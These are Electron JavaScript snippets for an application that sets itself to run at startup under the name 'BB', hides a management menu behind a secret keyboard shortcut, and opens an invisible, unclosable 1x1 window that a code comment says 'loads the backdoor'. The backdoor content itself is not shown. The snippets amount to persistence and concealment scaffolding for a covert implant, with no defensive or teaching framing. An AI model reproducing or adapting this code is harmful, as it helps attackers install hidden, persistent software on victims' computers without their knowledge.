auto launch
---
```js
// Passing true enables startup, false disables startup.
function manageStartup(enable) {
    let appLauncher = new AutoLaunch({
        // Change this to the name of the application or what
        // should appear in the startup menu.
        name: 'BB'
    });
    if (enable) {
        appLauncher.isEnabled().then(function(enabled){
            if(enabled) return;
            return appLauncher.enable();
        }).then(function(err){
            // If you want to remove all console output, remove lines that contain "console.error(err)"
            if (err !== undefined) console.error(err);
        });
    } else {
        appLauncher.isEnabled().then(function(enabled){
            if(!enabled) return;
            return appLauncher.disable();
        }).then(function(err){
            if (err !== undefined) console.error(err);
        }); 
    }
}

// Accept --startup as command line argument to enable on startup.
process.argv.forEach(function (val, index, array) {
  if (val === "--startup") {
    manageStartup(true);
  }
});
```
global shortcut
---
```js
    // Change CommandOrControl+Alt+\ to the shortcut to manage the application.
    globalShortcut.register('CommandOrControl+Alt+\\', function () {
        let result = dialog.showMessageBox({
            type: 'info',
            title: 'Shortcut pressed',
            message: 'You pressed the keyboard shortcut. \nIf you do not know what you are doing press cancel.',
            buttons: ['Quit Application', 'Enable Startup', 'Disable Startup', 'Cancel']
        });
        
        if (result === 0) {
            mainWindow = null;
            app.exit(0);
        } else if (result === 1) {
            manageStartup(true);
        } else if (result === 2) {
            manageStartup(false);
        }
    });

app.on('will-quit', function() {
    globalShortcut.unregisterAll();
});
```
hidden browser window
---
```js
    // Create a hidden browser window which loads the backdoor.
    mainWindow = new BrowserWindow({
        width: 1,
        height: 1,
        show: false,
        closable: false,
        transparent: true,
        resizable: false,
        skipTaskbar: true
    });

    mainWindow.loadURL(`file://${__dirname}/index.html`);
```
